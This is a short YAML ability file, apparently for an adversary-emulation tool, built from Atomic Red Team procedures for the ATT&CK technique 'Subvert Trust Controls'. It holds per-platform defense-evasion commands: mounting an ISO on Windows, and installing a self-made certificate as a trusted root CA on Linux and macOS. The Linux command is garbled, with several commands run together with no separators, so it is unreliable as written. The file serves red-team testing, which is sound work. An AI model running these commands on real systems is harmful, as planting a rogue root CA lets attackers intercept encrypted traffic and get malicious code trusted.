- id: acf27a70-428b-42a7-9c63-37c9b3b467ad
  name: Subvert Trust Controls
  description: Ability for Subvert Trust Controls (ATT&CK T1553). Generated from Atomic
    Red Team procedures; review and test safely before use.
  tactic: defense-evasion
  technique:
    attack_id: T1553
    name: Subvert Trust Controls
  platforms:
    windows:
      psh:
        command: Mount-DiskImage -ImagePath "#{path_of_iso}"
    linux:
      sh:
        command: 'openssl genrsa -out #{key_filename} 4096 openssl req -x509 -new
          -nodes -key #{key_filename} -sha256 -days 365 -subj "/C=US/ST=Denial/L=Springfield/O=Dis/CN=www.example.com"
          -out #{cert_filename} cp #{cert_filename} /etc/pki/ca-trust/source/anchors/
          update-ca-trust'
    darwin:
      sh:
        command: sudo security add-trusted-cert -d -r trustRoot -k "/Library/Keychains/System.keychain"
          "#{cert_filename}"
